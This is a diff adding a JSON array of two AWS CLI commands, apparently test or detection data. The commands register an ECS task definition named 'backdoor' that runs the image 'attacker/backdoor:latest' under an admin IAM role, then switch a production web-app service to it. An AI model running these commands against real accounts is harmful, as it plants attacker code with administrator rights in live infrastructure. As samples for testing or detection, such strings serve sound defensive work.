@@ -1,0 +1,4 @@
+[
+  "aws ecs register-task-definition --family backdoor --container-definitions '[{\"name\":\"app\",\"image\":\"attacker/backdoor:latest\",\"essential\":true}]' --task-role-arn arn:aws:iam::ACCOUNT:role/AdminRole",
+  "aws ecs update-service --cluster prod --service web-app --task-definition backdoor:1"
+]
